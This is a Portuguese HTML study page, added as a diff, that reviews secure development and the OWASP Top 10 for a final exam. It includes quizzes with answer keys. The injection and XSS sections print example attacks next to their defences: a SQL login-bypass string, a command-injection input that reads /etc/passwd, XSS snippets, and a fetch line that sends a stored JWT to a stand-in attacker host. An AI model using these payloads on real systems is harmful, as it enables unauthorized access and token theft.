@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Segurança &amp; OWASP Top 10 — Revisão para a Prova Final</title>
+<meta name="description" content="Revisão densa de Desenvolvimento Seguro para a prova final: vulnerabilidades e ataques, Security by Design, normas (ISO 27001/27002, NIST, PCI DSS, LGPD), SQL Injection, XSS, buffer overflow, licenças e supply chain, análise estática (SonarQube), OWASP Top 10 2017 × 2021, Juice Shop, WebGoat, ZAP, Well-Architected e AWS Security Hub." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="assets/theme.css" />
+</head>
+<body>
+<div id="progress"></div>
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="brand"><span class="bar"></span> Arquitetura de Software</div>
+    <p class="brand-sub">Tópico 12 · Segurança &amp; OWASP</p>
+    <button class="menu-toggle" aria-label="Abrir menu">☰ Menu</button>
+    <nav>
+      <div class="group-label">Navegação</div>
+      <a href="index.html">← Hub de Revisão</a>
+
+      <div class="group-label">① Fundamentos</div>
+      <a href="#fundamentos">Vulnerabilidade × ataque × intrusão</a>
+      <a href="#security-by-design">Security by Design</a>
+      <a href="#normas">Normas &amp; regulamentações</a>
+
+      <div class="group-label">② Ataques</div>
+      <a href="#ataques">Catálogo de ataques</a>
+      <a href="#injection">SQL &amp; Command Injection</a>
+      <a href="#xss">Cross-Site Scripting (XSS)</a>
+      <a href="#buffer-overflow">Buffer overflow</a>
+      <a href="#casos-famosos">Ataques famosos</a>
+
+      <div class="group-label">③ Bibliotecas</div>
+      <a href="#licencas">Licenças de software</a>
+      <a href="#supply-chain">Riscos ao importar libs</a>
+
+      <div class="group-label">④ Análise de código</div>
+      <a href="#manutenibilidade">Manutenibilidade</a>
+      <a href="#analise-estatica">Análise estática &amp; SonarQube</a>
+      <a href="#sast-dast-sca">SAST × DAST × SCA</a>
+
+      <div class="group-label">⑤ OWASP</div>
+      <a href="#owasp">O que é a OWASP</a>
+      <a href="#top10-2021">OWASP Top 10 · 2021</a>
+      <a href="#top10-mudancas">2017 → 2021</a>
+      <a href="#top10-top4">As 4 primeiras em detalhe</a>
+      <a href="#owasp-projetos">Outros projetos OWASP</a>
+
+      <div class="group-label">⑥ Padrões na nuvem</div>
+      <a href="#well-architected">AWS Well-Architected</a>
+      <a href="#aws-ferramentas">WA Tool · Trusted Advisor · Security Hub</a>
+      <a href="#cis">CIS AWS Foundations</a>
+      <a href="#pci-dss">PCI DSS</a>
+      <a href="#nist">NIST</a>
+      <a href="#iso">ISO 27001 &amp; 27002</a>
+
+      <div class="group-label">Revisão</div>
+      <a href="#flashcards">Flashcards</a>
+      <a href="#glossario">Glossário</a>
+      <a href="#pegadinhas">Pegadinhas de prova</a>
+    </nav>
+  </aside>
+
+  <main class="content">
+    <div class="content-inner">
+
+      <header class="hero reveal">
+        <span class="eyebrow">Tópico 12 · Segurança &amp; OWASP</span>
+        <h1>Desenvolvimento Seguro &amp; OWASP Top 10</h1>
+        <p class="lede">As 6 aulas da disciplina de segurança numa página só: os <em>fundamentos</em> (vulnerabilidade, ataque, intrusão, Security by Design e normas), os <strong>ataques clássicos</strong> (SQL Injection, Command Injection, XSS, buffer overflow), o risco das <strong>bibliotecas de terceiros</strong> (licenças e supply chain), a <strong>análise estática</strong> com SonarQube, a <strong>OWASP</strong> com seu Top 10 (2017 × 2021) e ferramentas, e os <strong>padrões de segurança na nuvem</strong> (Well-Architected, Security Hub, CIS, PCI DSS, NIST, ISO).</p>
+      </header>
+
+      <div class="callout exam reveal">
+        <span class="tag">🎯 Como segurança cai na prova</span>
+        <p>Espere quatro tipos de questão: <strong>(1) classificação</strong> — "este cenário é qual ataque / qual categoria do Top 10?" (IDOR → A01; SSRF → A10; script salvo em comentário → XSS armazenado); <strong>(2) defesa correta</strong> — "qual é a contramedida primária?" (prepared statements contra SQLi, cookie <code>HttpOnly</code> contra roubo de token por XSS); <strong>(3) distinções pareadas</strong> — ISO 27001 × 27002, SAST × DAST, Juice Shop × WebGoat, WA Tool × Trusted Advisor × Security Hub, GPL × MIT; <strong>(4) mudanças 2017 → 2021</strong> do Top 10 — o que subiu, o que foi fundido e as 3 categorias novas.</p>
+      </div>
+
+      <!-- ============================================================ AULA 1 ============================================================ -->
+      <h2 id="fundamentos"><span class="h2-kicker">Aula 1 · Fundamentos</span>Vulnerabilidade × ameaça × ataque × intrusão</h2>
+      <p>Quatro palavras que o senso comum usa como sinônimos, mas que a prova trata como <strong>etapas diferentes</strong> de um mesmo evento. A ordem é: existe uma <span class="lead-term">vulnerabilidade</span> → uma <span class="lead-term">ameaça</span> pode explorá-la → um <span class="lead-term">ataque</span> é a tentativa de exploração → a <span class="lead-term">intrusão</span> é o ataque que deu certo.</p>
+
+      <div class="diagram reveal">
+        <div class="flow">
+          <div class="node">Vulnerabilidade<br><small>a falha que existe</small></div>
+          <span class="arrow-h">→</span>
+          <div class="node">Ameaça<br><small>quem/o que pode explorar</small></div>
+          <span class="arrow-h">→</span>
+          <div class="node">Ataque<br><small>a tentativa de exploração</small></div>
+          <span class="arrow-h">→</span>
+          <div class="node accent">Intrusão<br><small>ataque bem-sucedido</small></div>
+        </div>
+        <div class="legend">
+          <span><span class="sw" style="background:var(--accent)"></span> A intrusão é o único estágio em que há acesso não autorizado efetivo</span>
+        </div>
+      </div>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Termo</th><th>Definição</th><th>Critério de distinção</th><th>Exemplo (tela de login)</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Vulnerabilidade</strong></td><td>Fraqueza no código, na configuração ou no processo que <em>pode</em> ser explorada.</td><td>É <strong>estática</strong>: existe mesmo que ninguém a explore.</td><td>O login não limita tentativas e concatena a senha numa query SQL.</td></tr>
+            <tr><td><strong>Ameaça</strong></td><td>Agente ou evento com potencial de explorar uma vulnerabilidade.</td><td>É o <strong>potencial</strong> de dano (quem / o quê).</td><td>Um bot que testa senhas vazadas em massa.</td></tr>
+            <tr><td><strong>Ataque</strong></td><td>Ação deliberada de explorar uma vulnerabilidade.</td><td>É a <strong>tentativa</strong> — pode falhar.</td><td>O bot dispara 50 mil tentativas de login.</td></tr>
+            <tr><td><strong>Intrusão</strong></td><td>Acesso não autorizado efetivamente obtido.</td><td>É o <strong>sucesso</strong> do ataque.</td><td>O bot acerta uma senha e entra na conta.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>Dois termos vizinhos completam o vocabulário: <strong>exploit</strong> é o código ou a técnica concreta que explora uma vulnerabilidade específica, e <strong>risco</strong> é a combinação da <em>probabilidade</em> de a ameaça se concretizar com o <em>impacto</em> que ela causaria (risco ≈ probabilidade × impacto). Uma vulnerabilidade grave num sistema sem exposição pode ter risco baixo; uma vulnerabilidade simples numa tela pública tem risco alto.</p>
+
+      <div class="card reveal">
+        <h4>A tríade CIA — o que a segurança protege</h4>
+        <ul>
+          <li><strong>Confidencialidade:</strong> só quem tem autorização lê o dado. Quebrada por vazamento, sniffing, SQL Injection que lê tabelas.</li>
+          <li><strong>Integridade:</strong> o dado não é alterado sem autorização. Quebrada por adulteração, MITM que modifica a mensagem.</li>
+          <li><strong>Disponibilidade:</strong> o sistema responde quando precisa. Quebrada por DoS/DDoS, ransomware.</li>
+        </ul>
+        <p>A Resolução do Bacen citada na aula usa exatamente esses três termos ("integridade, confidencialidade e disponibilidade").</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="B">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Numa revisão de código, a equipe descobre que um endpoint monta a query SQL concatenando o texto digitado pelo usuário. Ninguém explorou isso ainda. Como esse achado se classifica?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Intrusão, porque o dado do usuário chega ao banco.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Vulnerabilidade, porque é uma falha explorável que existe mesmo sem ataque.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Ataque, porque o código malicioso já está no sistema.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Ameaça, porque é o agente que causará o dano.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> A falha existe no código independentemente de alguém explorá-la: é uma <strong>vulnerabilidade</strong>. <em>Ataque</em> exigiria uma tentativa de exploração; <em>intrusão</em> exigiria acesso obtido; <em>ameaça</em> é o agente (o atacante, o bot), não a falha.</div>
+      </div>
+
+      <h3 id="security-by-design">Security by Design</h3>
+      <p><span class="lead-term">Security by Design</span> (desenvolvimento seguro por design) é tratar a segurança como requisito <strong>desde o início</strong> do projeto, construída junto com o software — em vez de corrigir vulnerabilidades depois que ele está pronto. A aula compara com o TDD: assim como o teste vem antes do código, a análise de segurança acompanha cada etapa desde as primeiras linhas. Esse movimento de trazer a segurança para o começo do ciclo também é chamado de <strong>shift-left</strong>.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Elemento</th><th>O que significa</th><th>Exemplo da aula</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Avaliação de Ameaças</strong></td><td>Identificar no início do projeto as ameaças que o sistema enfrentará e já preparar e testar os cenários.</td><td>Mapear telas de login e posts de usuário como alvos de SQL/Command Injection.</td></tr>
+            <tr><td><strong>Minimização da Superfície de Ataque</strong></td><td>Reduzir o que fica exposto — menos funcionalidades acessíveis a quem não tem autorização.</td><td>Desligar endpoints de debug; não expor portas desnecessárias.</td></tr>
+            <tr><td><strong>Princípio do Menor Privilégio</strong></td><td>Cada usuário (ou serviço) tem só o acesso mínimo necessário à sua função.</td><td>Quem pode acessar a tela de gerenciamento de usuários? Quanto menos perfis, mais seguro.</td></tr>
+            <tr><td><strong>Segmentação de Rede</strong></td><td>Isolar redes e sistemas com controle de acesso entre eles; um comprometimento afeta só uma parte.</td><td>Separar VPCs das APIs e dos bancos; banco só em sub-rede privada.</td></tr>
+            <tr><td><strong>Validação e Sanitização de Dados</strong></td><td>Todo input do usuário é validado e sanitizado.</td><td>Evita SQL/code injection e buffer overflow.</td></tr>
+            <tr><td><strong>Criptografia</strong></td><td>Dados pessoais — sobretudo os sensíveis — criptografados <strong>em repouso e em trânsito</strong>.</td><td>TLS na comunicação; banco e backups criptografados.</td></tr>
+            <tr><td><strong>Teste de Segurança Contínuo</strong></td><td>Varreduras de vulnerabilidade e revisões de código durante todo o ciclo.</td><td>Scan no pipeline a cada commit.</td></tr>
+            <tr><td><strong>Educação em Segurança</strong></td><td>Toda a equipe treinada em boas práticas de desenvolvimento seguro.</td><td>Treinos com OWASP Juice Shop/WebGoat (Aula 5).</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="mnemonic">
+        <div class="m-head">Mnemônico — os 8 elementos do Security by Design</div>
+        <div class="m-word">"<b>A</b>rquitetos <b>M</b>edrosos <b>M</b>antêm <b>S</b>istemas <b>V</b>alidados, <b>C</b>riptografados, <b>T</b>estados e <b>E</b>ducados"</div>
+        <ul>
+          <li><b>A</b> → <strong>A</strong>valiação de ameaças</li>
+          <li><b>M</b> → <strong>M</strong>inimização da superfície de ataque</li>
+          <li><b>M</b> → <strong>M</strong>enor privilégio</li>
+          <li><b>S</b> → <strong>S</strong>egmentação de rede</li>
+          <li><b>V</b> → <strong>V</strong>alidação e sanitização de dados</li>
+          <li><b>C</b> → <strong>C</strong>riptografia (repouso e trânsito)</li>
+          <li><b>T</b> → <strong>T</strong>este de segurança contínuo</li>
+          <li><b>E</b> → <strong>E</strong>ducação em segurança</li>
+        </ul>
+      </div>
+
+      <div class="card reveal">
+        <h4>Princípios correlatos que aparecem nas alternativas</h4>
+        <ul>
+          <li><strong>Defesa em profundidade:</strong> várias camadas independentes de proteção (WAF + validação + prepared statement + menor privilégio no banco); se uma falha, a outra segura.</li>
+          <li><strong>Fail secure (falhar fechado):</strong> em caso de erro, negar o acesso em vez de liberar.</li>
+          <li><strong>Secure by Default:</strong> a configuração padrão já é a mais segura (ex.: MFA ligado por padrão). Complementa o Security by Design; a CISA (agência de cibersegurança dos EUA) promove os dois.</li>
+          <li><strong>Privacy by Design:</strong> o equivalente para privacidade, exigido pela LGPD/GDPR — ver Tópico 10.</li>
+        </ul>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Ao desenhar a infraestrutura, o arquiteto coloca o banco de dados numa sub-rede privada, sem acesso direto da internet, e separa a VPC das APIs da VPC dos bancos. Qual elemento do Security by Design isso aplica?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Princípio do menor privilégio.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Validação e sanitização de dados.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Segmentação de rede.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Teste de segurança contínuo.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Isolar redes para que um comprometimento atinja só uma parte do sistema é <strong>segmentação de rede</strong> — é o exemplo literal da aula. <em>Menor privilégio</em> fala de permissões de usuários/serviços, não de topologia de rede; <em>validação</em> trata do input; <em>teste contínuo</em> trata de varreduras ao longo do ciclo.</div>
+      </div>
+
+      <h3 id="normas">Normas e regulamentações</h3>
+      <p>As normas variam por <strong>indústria</strong> (financeira, saúde), por <strong>país</strong> (LGPD, GDPR) e por requisitos específicos. O critério que mais cai em prova é a <strong>natureza</strong> de cada uma: algumas são <em>leis</em> (obrigatórias), outras são <em>normas voluntárias</em>, outras são <em>padrões contratuais de mercado</em> ou <em>relatórios de auditoria</em>.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Norma</th><th>Natureza</th><th>Quem emite / onde vale</th><th>Do que trata</th></tr></thead>
+          <tbody>
+            <tr><td><strong>ISO/IEC 27001</strong></td><td>Norma internacional <strong>certificável</strong></td><td>ISO/IEC · global</td><td><strong>Requisitos</strong> para criar e manter um SGSI (Sistema de Gestão de Segurança da Informação).</td></tr>
+            <tr><td><strong>ISO/IEC 27002</strong></td><td>Guia de boas práticas (<strong>não certificável</strong>)</td><td>ISO/IEC · global</td><td>Complemento da 27001: descreve em detalhe os <strong>controles</strong> (políticas, ativos, RH, físico, operações, comunicações, desenvolvimento, incidentes, conformidade).</td></tr>
+            <tr><td><strong>NIST SP 800-53</strong></td><td>Catálogo de controles</td><td>NIST · governo dos EUA</td><td>Centenas de controles (acesso, autenticação, auditoria, criptografia, incidentes). Exigido pela <strong>FISMA</strong> para órgãos federais e seus fornecedores.</td></tr>
+            <tr><td><strong>GDPR</strong></td><td><strong>Lei</strong></td><td>União Europeia</td><td>Proteção de dados pessoais de cidadãos da UE: consentimento, direitos do titular.</td></tr>
+            <tr><td><strong>LGPD</strong></td><td><strong>Lei</strong> (13.709/2018)</td><td>Brasil</td><td>Proteção de dados pessoais no Brasil, inspirada na GDPR.</td></tr>
+            <tr><td><strong>HIPAA</strong></td><td><strong>Lei</strong> (1996)</td><td>EUA · saúde</td><td>Privacidade e segurança de dados de saúde; regras de privacidade, segurança, notificação de violação e fiscalização.</td></tr>
+            <tr><td><strong>PCI DSS</strong></td><td>Padrão de mercado (contratual)</td><td>PCI SSC (Visa, Mastercard, Amex, Discover, JCB)</td><td>Proteção de dados de cartão de pagamento.</td></tr>
+            <tr><td><strong>Resolução Bacen</strong></td><td>Regulação setorial</td><td>Banco Central · Brasil · setor financeiro</td><td>Segurança cibernética em instituições financeiras: integridade, confidencialidade e disponibilidade.</td></tr>
+            <tr><td><strong>SOC 2</strong></td><td><strong>Relatório de auditoria</strong></td><td>AICPA · EUA (uso global)</td><td>Avalia os controles de segurança de um prestador de serviços de TI.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p><strong>Não é preciso seguir todas as normas</strong> para considerar um software seguro — seria quase impossível. A recomendação da aula é escolher uma <strong>base</strong> (ex.: ISO 27001/27002, por serem internacionais) ou a que <strong>regula o seu mercado</strong> (HIPAA, Bacen). A exceção são <strong>LGPD e GDPR</strong>: são <em>leis</em>, não sugestões, e por isso precisam ser cumpridas.</p>
+      </div>
+
+      <div class="callout reveal">
+        <span class="tag">ℹ Sobre a norma do Bacen</span>
+        <p>O material cita a "Resolução Bacen nº 4.553/2017". A norma do Conselho Monetário Nacional que trata especificamente da política de segurança cibernética das instituições financeiras é a <strong>Resolução CMN nº 4.658/2018</strong>, hoje substituída pela <strong>4.893/2021</strong>. Na prova, o que importa é a ideia: o setor financeiro brasileiro tem regulação própria de segurança cibernética emitida pelo Banco Central/CMN.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="A">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Uma empresa quer obter uma <strong>certificação</strong> que comprove a clientes que mantém um Sistema de Gestão de Segurança da Informação. Qual norma define os requisitos auditáveis para essa certificação?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>ISO/IEC 27001.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>ISO/IEC 27002.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>GDPR.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>OWASP Top 10.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> A <strong>27001</strong> define os <em>requisitos</em> do SGSI e é a norma contra a qual a organização é certificada. A <em>27002</em> é um guia de controles e não certifica; a <em>GDPR</em> é uma lei europeia de dados pessoais; o <em>OWASP Top 10</em> é um documento de conscientização, não uma norma de certificação.</div>
+      </div>
+
+      <!-- ============================================================ AULA 2 ============================================================ -->
+      <h2 id="ataques"><span class="h2-kicker">Aula 2 · Ataques</span>Catálogo dos principais ataques</h2>
+      <p>A aula agrupa os ataques mais comuns a servidores em 7 famílias. Em prova, a pergunta típica descreve o <strong>mecanismo</strong> e pede o nome — ou dá o nome e pede a <strong>defesa</strong>. A coluna "mecanismo" é o critério que separa um do outro.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Família</th><th>Ataque</th><th>Mecanismo (critério de distinção)</th><th>Defesa principal</th></tr></thead>
+          <tbody>
+            <tr><td rowspan="2"><strong>Injeção</strong></td><td>SQL Injection</td><td>Comandos SQL maliciosos em campos de texto, que o app concatena na query.</td><td>Queries parametrizadas (prepared statements).</td></tr>
+            <tr><td>Command Injection</td><td>Comandos do sistema operacional injetados num input que o código repassa a um shell.</td><td>Não chamar shell; API nativa; allowlist de valores.</td></tr>
+            <tr><td rowspan="2"><strong>Sessão</strong></td><td>Man-in-the-Middle (MITM)</td><td>O atacante se põe <em>entre</em> as duas partes e intercepta ou altera o tráfego sem que percebam.</td><td>TLS/HTTPS em tudo, HSTS, validação de certificado.</td></tr>
+            <tr><td>Session Fixation (sessão fixa)</td><td>O atacante <em>fixa</em> um ID de sessão conhecido e força a vítima a autenticar com ele; depois usa o mesmo ID.</td><td><strong>Gerar um novo ID de sessão após o login</strong>; não aceitar ID vindo da URL.</td></tr>
+            <tr><td rowspan="2"><strong>Autenticação</strong></td><td>Força bruta</td><td>Sequência massiva de tentativas de login/senha.</td><td>Rate limiting, bloqueio progressivo, CAPTCHA, MFA.</td></tr>
+            <tr><td>Senha fraca</td><td>Força bruta focada em senhas fracas ou comuns (listas de senhas vazadas).</td><td>Política de senha, checar contra listas de senhas vazadas, MFA.</td></tr>
+            <tr><td rowspan="2"><strong>Negação de serviço</strong></td><td>DoS</td><td>Volume gigante de requisições a partir de <strong>um único ponto</strong> derruba o serviço.</td><td>Rate limiting, bloqueio de IP.</td></tr>
+            <tr><td>DDoS</td><td>O mesmo objetivo, a partir de <strong>muitos pontos</strong> — uma rede de computadores zumbis (botnet).</td><td>CDN, WAF, serviços anti-DDoS (ex.: AWS Shield), autoscaling.</td></tr>
+            <tr><td rowspan="2"><strong>Protocolos e rede</strong></td><td>Exploração de vulnerabilidades de rede</td><td>Explora falhas em protocolos de rede para obter acesso.</td><td>Patching, firewall, segmentação.</td></tr>
+            <tr><td>ARP Poisoning (envenenamento de ARP)</td><td>Adultera a tabela ARP (que associa IP a endereço MAC numa rede Ethernet) para redirecionar o tráfego a uma máquina maliciosa.</td><td>Entradas ARP estáticas, inspeção dinâmica de ARP no switch, TLS.</td></tr>
+            <tr><td><strong>Aplicações web</strong></td><td>XSS (Cross-Site Scripting)</td><td>Script malicioso injetado em páginas e executado no navegador de outros usuários; rouba cookies/tokens.</td><td>Output encoding, CSP, cookie <code>HttpOnly</code>.</td></tr>
+            <tr><td rowspan="2"><strong>Escuta de rede</strong></td><td>Sniffing de pacotes</td><td>Monitora o tráfego para capturar dados sensíveis (login, senha, cartão).</td><td>Criptografia em trânsito (TLS).</td></tr>
+            <tr><td>Interceptação de dados confidenciais</td><td>Monitora a rede da vítima para capturar dados em trânsito entre cliente e servidor.</td><td>Criptografia em trânsito (TLS), VPN.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — DoS × DDoS e Sniffing × MITM</span>
+        <p><strong>DoS</strong> e <strong>DDoS</strong> têm o mesmo objetivo (indisponibilidade); a diferença é <strong>só a origem</strong>: um ponto × muitos pontos (botnet). Já <strong>sniffing</strong> é <em>passivo</em> (só escuta), enquanto o <strong>MITM</strong> é <em>ativo</em>: o atacante fica no meio e pode <strong>alterar</strong> as mensagens. Os dois são neutralizados pela mesma defesa: criptografia em trânsito.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="D">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Um atacante envia à vítima um link com um ID de sessão que ele próprio gerou. A vítima faz login por esse link e o sistema mantém o mesmo ID. Agora o atacante usa esse ID e acessa a conta. Qual ataque é esse e qual a defesa mais direta?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Man-in-the-Middle; usar HTTPS.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Força bruta; bloquear a conta após 5 tentativas.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>XSS refletido; aplicar output encoding.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Session Fixation; gerar um novo ID de sessão no momento do login.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O atacante <strong>fixou</strong> a sessão antes do login — é <strong>Session Fixation</strong>. Se o servidor trocar o ID ao autenticar, o ID que o atacante conhece deixa de valer. <em>MITM</em> exige interceptar o tráfego; <em>força bruta</em> adivinha credenciais; <em>XSS</em> injeta script na página.</div>
+      </div>
+
+      <h3 id="injection">SQL Injection e Command Injection</h3>
+      <p>Os dois ataques têm a mesma raiz: o programa <strong>mistura dado com comando</strong>. O input do usuário, que deveria ser só um valor, é concatenado numa string que outro interpretador executa — o banco de dados (SQL Injection) ou o shell do sistema operacional (Command Injection).</p>
+
+      <pre><code>// ✗ VULNERÁVEL — o input vira parte do comando SQL
+query = "SELECT * FROM usuarios WHERE email = '" + email + "' AND senha = '" + senha + "'"
+
+// Input do atacante no campo email:   ' OR '1'='1' --
+// Query resultante:
+SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = '...'
+// '1'='1' é sempre verdadeiro e o -- comenta o resto → login sem senha
+
+// ✓ SEGURO — query parametrizada (prepared statement)
+query = "SELECT * FROM usuarios WHERE email = ? AND senha_hash = ?"
+db.execute(query, [email, hashDaSenha])   // o banco trata os valores só como dados</code></pre>
+
+      <pre><code>// ✗ VULNERÁVEL — Command Injection
+exec("ping -c 1 " + host)
+// Input do atacante:   8.8.8.8; cat /etc/passwd
+// O shell executa os dois comandos
+
+// ✓ SEGURO — sem shell, argumentos separados e validados por allowlist
+if (!/^[0-9.]+$/.test(host)) throw new Error("host inválido")
+execFile("ping", ["-c", "1", host])</code></pre>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Defesa</th><th>Contra SQLi</th><th>Contra Command Injection</th><th>Nível</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Separar dado de comando</strong></td><td>Prepared statements / queries parametrizadas; ORM sem SQL cru concatenado.</td><td>Usar API nativa da linguagem em vez de shell; passar argumentos como lista.</td><td><span class="pill ok">Primária</span></td></tr>
+            <tr><td><strong>Validação por allowlist</strong></td><td>Aceitar só o formato esperado (e-mail, número, enum).</td><td>Aceitar só caracteres/valores esperados.</td><td><span class="pill tat">Complementar</span></td></tr>
+            <tr><td><strong>Menor privilégio</strong></td><td>Usuário do banco sem permissão de <code>DROP</code>/<code>ALTER</code>.</td><td>Processo da aplicação sem root.</td><td><span class="pill tat">Contenção</span></td></tr>
+            <tr><td><strong>Escape / sanitização</strong></td><td>Escapar caracteres especiais.</td><td>Escapar metacaracteres do shell (<code>; | &amp; $</code>).</td><td><span class="pill warn">Frágil sozinha</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p>A defesa <strong>primária</strong> contra SQL Injection é a <strong>query parametrizada</strong>, não a sanitização nem a validação no front-end. Validação só no navegador não protege nada: o atacante chama a API diretamente. E usar ORM <em>não</em> imuniza: um <code>query("... " + input)</code> cru dentro do ORM continua vulnerável.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="B">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Qual é a contramedida <strong>mais eficaz</strong> contra SQL Injection?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Validar os campos com JavaScript no navegador antes do envio.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Usar queries parametrizadas (prepared statements), que separam o comando SQL dos valores.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Criptografar a conexão com o banco usando TLS.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Esconder as mensagens de erro do banco de dados.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Com a query parametrizada, o banco recebe o comando e os valores separadamente — o input nunca é interpretado como SQL. Validação no navegador é contornável chamando a API direto; TLS protege o <em>trânsito</em>, não a montagem da query; esconder erros só dificulta a exploração (ainda existe SQL Injection "às cegas", o <em>blind SQLi</em>).</div>
+      </div>
+
+      <h3 id="xss">Cross-Site Scripting (XSS)</h3>
+      <p>No <span class="lead-term">XSS</span>, o atacante consegue que a página de um site legítimo execute um <strong>JavaScript dele</strong> no navegador de outros usuários. Como o script roda com a "identidade" do site, ele lê cookies, tokens e o conteúdo da página, e pode agir em nome da vítima. A diferença para o SQL Injection é o <strong>alvo</strong>: SQLi ataca o servidor/banco; XSS ataca o <strong>navegador do usuário</strong>, usando o servidor como veículo.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Tipo</th><th>Onde o script fica</th><th>Quem é atingido</th><th>Exemplo</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Refletido</strong> (reflected)</td><td>Vem na própria requisição (URL/parâmetro) e é devolvido na resposta. <strong>Não é salvo.</strong></td><td>Quem clica no link malicioso.</td><td><code>/busca?q=&lt;script&gt;roubar()&lt;/script&gt;</code> enviado por e-mail.</td></tr>
+            <tr><td><strong>Armazenado</strong> (stored / persistente)</td><td>Gravado no banco (comentário, perfil, post) e servido a todos.</td><td><strong>Todo</strong> visitante da página — o mais perigoso.</td><td>Samy worm no MySpace (2005).</td></tr>
+            <tr><td><strong>DOM-based</strong></td><td>Nunca passa pelo servidor: o JavaScript da própria página insere dado não confiável no DOM.</td><td>Quem abre a URL manipulada.</td><td><code>el.innerHTML = location.hash</code>.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="card reveal">
+        <h4>XSS e autenticação JWT — o ponto citado na aula</h4>
+        <p>Um <strong>JWT</strong> (JSON Web Token) é o token de autenticação que o front-end envia a cada requisição. Onde ele fica guardado decide o estrago de um XSS:</p>
+        <ul>
+          <li><strong><code>localStorage</code> / <code>sessionStorage</code>:</strong> qualquer JavaScript da página lê. Um único XSS faz <code>fetch('https://atacante.com?t=' + localStorage.token)</code> e o atacante passa a usar o token de qualquer lugar até ele expirar.</li>
+          <li><strong>Cookie <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code>:</strong> o JavaScript <em>não consegue ler</em> o cookie (<code>HttpOnly</code>), ele só trafega em HTTPS (<code>Secure</code>) e não é enviado em requisições de outros sites (<code>SameSite</code>, que mitiga CSRF). O XSS ainda pode agir dentro da página, mas não consegue <strong>exfiltrar</strong> o token.</li>
+          <li><strong>Mitigações adicionais:</strong> token de vida curta + refresh token, revogação no servidor.</li>
+        </ul>
+      </div>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Defesa contra XSS</th><th>O que faz</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Output encoding contextual</strong></td><td>Converte <code>&lt;</code> em <code>&amp;lt;</code> etc. ao exibir dado do usuário — o navegador mostra o texto em vez de executar. Frameworks como React/Angular fazem isso por padrão.</td></tr>
+            <tr><td><strong>Sanitização de HTML</strong></td><td>Quando é preciso aceitar HTML (editor rico), remover tags/atributos perigosos com biblioteca dedicada (ex.: DOMPurify).</td></tr>
+            <tr><td><strong>Content Security Policy (CSP)</strong></td><td>Cabeçalho HTTP que define de onde scripts podem ser carregados; bloqueia script inline injetado.</td></tr>
